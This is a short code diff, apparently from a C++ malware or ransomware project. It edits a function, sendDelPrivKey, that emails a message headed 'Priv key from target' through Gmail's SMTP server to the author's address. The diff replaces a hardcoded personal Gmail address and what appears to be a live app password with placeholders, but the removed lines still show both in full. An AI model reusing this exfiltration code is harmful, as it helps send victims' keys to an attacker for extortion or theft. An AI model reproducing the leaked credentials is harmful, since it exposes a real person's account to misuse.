@@ -44,10 +44,10 @@ int sendDelPrivKey()
     oSmtp->LicenseCode = _T("TryIt");
 
     // Set your Gmail email address
-    oSmtp->FromAddr = _T("sebby.hyjek@gmail.com");
+    oSmtp->FromAddr = _T("email");
 
     // Add recipient email address
-    oSmtp->AddRecipientEx(_T("sebby.hyjek@gmail.com"), 0);
+    oSmtp->AddRecipientEx(_T("email"), 0);
 
     // Set email subject
     oSmtp->Subject = _T("Priv key from target");
@@ -56,8 +56,8 @@ int sendDelPrivKey()
     oSmtp->ServerAddr = _T("smtp.gmail.com");
 
     // Gmail user authentication
-    oSmtp->UserName = _T("sebby.hyjek@gmail.com");
-    oSmtp->Password = _T("nxsg zpqq hygo lpif");
+    oSmtp->UserName = _T("email");
+    oSmtp->Password = _T("auth code");
 
     // Use SSL 465 port
     oSmtp->ServerPort = 465;
